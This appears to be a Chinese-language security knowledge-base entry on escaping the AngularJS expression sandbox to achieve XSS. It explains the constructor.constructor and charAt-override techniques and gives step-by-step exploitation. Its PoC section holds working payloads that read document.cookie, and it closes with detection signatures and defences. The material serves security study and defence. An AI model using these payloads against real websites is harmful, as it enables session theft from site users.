---
id: web-generic-xss-angularjs-sandbox-escape
title: AngularJS 表达式沙箱逃逸：constructor.constructor 与 charAt 覆写绕过
type: scenario
domain: web
path: web/generic/xss
technique: angularjs-expression-sandbox-escape
tags:
- xss
- angularjs
- sandbox-escape
- template-injection
- dom-xss
- client-side
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V13
  verified_at: '2026-11-05T01:49:24+08:00'
  notes: 已对照原文核对：{{constructor.constructor}} 与 charAt 覆写+orderBy/fromCharCode 两条链、沙箱版本说明均与原文一致；未实际在浏览器执行
url: /docs/web/generic/xss/web-generic-xss-angularjs-sandbox-escape/
draft: false
kb_aliases:
- AngularJS XSS
- '{{constructor.constructor}}'
- AngularJS 沙箱绕过
- ng-app 模板注入
---

## 一句话结论

当页面处于 `ng-app` 作用域内且把用户输入作为 AngularJS 表达式内容输出时，HTML 转义无法阻止 `{{ }}` 插值；即使 AngularJS 表达式沙箱禁止直接访问 `window`/`document`，也能通过 `constructor.constructor` 取得 `Function` 构造函数，或用覆写 `charAt` 破坏沙箱标识符检查，从而执行任意 JS。

## 原理

- AngularJS 在 `ng-app` 作用域内扫描文本中的 `{{ ... }}` 表达式，用内置表达式解释器求值。`htmlspecialchars` 只转义 `<`、`>`、引号等 HTML 元字符，不转义 `{`、`}`，因此 `{{...}}` 仍会进入表达式解析器。
- **constructor 逃逸**：表达式沙箱通常阻止直接引用 `window`、`document` 以及 `__proto__` 等敏感成员。但任何对象的 `constructor` 属性仍可访问：`x.constructor` 得到其构造函数，`x.constructor.constructor` 通常就是原生 `Function` 构造函数。`Function('alert(1)')()` 等价于 `eval`，不受沙箱对表达式成员的限制。
- **charAt 覆写逃逸**：带沙箱的版本在解析成员名时用 `charAt` 检查标识符首字符，以拒绝 `constructor` 之类的危险名称。攻击者可在同一表达式中把 `String.prototype.charAt` 替换为 `Array.prototype.join`：之后 `"constructor".charAt(0)` 之类的“单字符检查”会返回整个字符串 `constructor`，沙箱误判为合法标识符，从而放行对 `toString().constructor`（即 `String` 构造函数）的访问，再用 `fromCharCode` 构造并执行代码。
- 两条链的共同点：沙箱是**同进程内的 JS 逻辑**，不是安全边界；只要能操纵原型/构造函数，就能回到原生 `Function`/`eval`。

## 触发条件

- 页面引入并初始化 AngularJS（存在 `ng-app`），且模板中包含 `{{ 用户输入 }}`、`ng-init`、`ng-bind-html` 等可控表达式/HTML 插值；
- 服务端只做 HTML 转义，未过滤 `{{`/`}}` 或未使用 `ng-non-bindable`；
- 目标版本的 AngularJS 仍启用表达式沙箱（约 1.6.0 之前；1.6 起沙箱被移除，表达式本身可直接触达全局对象，防护重点变为 CSP/禁用动态模板）；
- CSP 未阻止 AngularJS 的表达式求值（AngularJS 需要 `unsafe-eval`，因此严格 CSP 可阻断）。

## 利用步骤

1. 确认页面有 `ng-app` 且输入回显位于其作用域内（可能需等待 AngularJS 编译）。
2. 提交 `{{1+1}}`，若页面显示 `2` 而非原样文本，说明表达式被执行。
3. 尝试 `{{constructor.constructor('alert(1)')()}}`。
4. 若被沙箱拦截，使用 `charAt` 覆写链：
   - `a=toString().constructor.prototype;a.charAt=[].join;`
   - `[1]|orderBy:toString().constructor.fromCharCode(120,61,...)=1`（数字数组为 `x=alert(1)` 的字符码）。
5. 在目标浏览器验证；若 `alert` 被拦截，改用 `fetch` 外带 cookie 验证。

## PoC

```html
<!-- HTML 上下文，服务端仅 htmlspecialchars -->
<div ng-app id="result">Hello, {{INPUT}}</div>

<!-- 1) constructor.constructor -->
{{constructor.constructor('alert(document.cookie)')()}}

<!-- 2) charAt 覆写链（AngularJS 带沙箱版本） -->
?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41)=1
```

```text
# fromCharCode 解码结果：x=alert(document.cookie)
```

## 变体与关联

- 变体：`ng-init` 中直接承载表达式；`{{$eval('alert(1)')}}` 等旧版本特性。
- 变体：CSP 允许 `unsafe-eval` 时 AngularJS 表达式可执行；若 CSP 严格禁止，表达式会被拦截，需改用纯 DOM XSS 载体。
- 关联：[[web-generic-xss-javascript-context-injection]]（JS 源码上下文注入）；[[web-generic-xss-csp-self-jsonp-callback-bypass]]（同源脚本源被 CSP 放行时的绕过）。

## 检测与防御

- 检测：请求/响应中出现 `{{`、`}}`、`constructor.constructor`、`charAt=`、`fromCharCode`、`|orderBy:` 等特征；`ng-app` 页面中用户可控的插值。
- 防御：不要在 AngularJS 模板中插入不可信数据；使用 `ng-bind`/`textContent` 绑定纯文本，或对输出做 `ng-non-bindable`。
- 防御：升级/迁移 AngularJS（已 EOL）；无法迁移时禁止用户输入进入表达式，并在构建期扫描 `{{` 插值。
- 防御：部署不允许 `unsafe-eval` 的 CSP；禁止内联脚本与动态编译（AngularJS 的 `ng-csp` 模式）。
